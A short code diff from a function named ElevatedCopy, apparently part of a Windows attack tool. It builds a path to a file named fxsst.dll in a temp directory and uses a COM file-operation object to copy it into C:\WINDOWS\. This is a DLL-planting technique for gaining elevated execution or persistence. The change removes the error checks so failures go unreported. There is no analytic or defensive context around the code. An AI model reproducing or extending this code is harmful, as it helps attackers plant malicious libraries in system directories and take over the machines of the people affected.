@@ -123,18 +123,8 @@ void ElevatedCopy()
     // Build the full path for the DLL
     wcscpy_s(szFxsstDllPath, len - 1, szLongTempDir);
     wcscat_s(szFxsstDllPath, len, L"fxsst.dll");
-    hr = SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
-    if (FAILED(hr))
-    {
-        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
-        return;
-    }
-    hr = SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
-    if (FAILED(hr))
-    {
-        MessageBox(NULL, L"Failed to create IShellItem from parsing name", L"Error", MB_OK);
-        return;
-    }
+    SHCreateItemFromParsingName(szFxsstDllPath, NULL, IID_PPV_ARGS(&from));
+    SHCreateItemFromParsingName(L"C:\\WINDOWS\\", NULL, IID_PPV_ARGS(&to));
     pfo->CopyItem(from, to, L"fxsst.dll", NULL);
     pfo->PerformOperations();
     from->Release();
